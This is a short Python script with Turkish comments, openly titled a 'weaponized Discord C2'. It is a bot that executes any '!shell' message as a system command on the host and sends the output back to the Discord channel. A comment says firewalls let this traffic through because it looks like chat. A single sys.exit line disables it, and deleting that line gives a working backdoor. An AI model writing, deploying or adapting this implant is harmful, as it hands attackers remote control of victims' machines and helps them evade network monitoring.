import discord
import subprocess
import os
import sys

# --- EMNİYET PİMİ ---
sys.exit("UYARI: Bu kod Discord üzerinden RCE (Remote Code Execution) sağlar.")

print("--- WEAPONIZED DISCORD C2 ---")

client = discord.Client()

@client.event
async def on_message(message):
    if message.author == client.user:
        return

    if message.content.startswith('!shell'):
        # 1. KOMUT ÇALIŞTIRMA (Weaponized Part)
        # Simülasyonda: print(message.content)
        # Gerçekte: Gelen mesajı sistem komutu olarak çalıştır.
        
        command = message.content.split(" ", 1)[1]
        print(f"[*] Komut Geldi: {command}")
        
        try:
            # subprocess ile terminale eriş
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            response = output.decode('cp857') # Türkçe karakter desteği
        except Exception as e:
            response = str(e)

        # 2. SONUCU GERİ GÖNDER
        # Firewall, trafiği "Discord Sohbeti" sandığı için engellemez.
        await message.channel.send(f"```\n{response}\n```")

if __name__ == "__main__":
    client.run('DISCORD_BOT_TOKEN')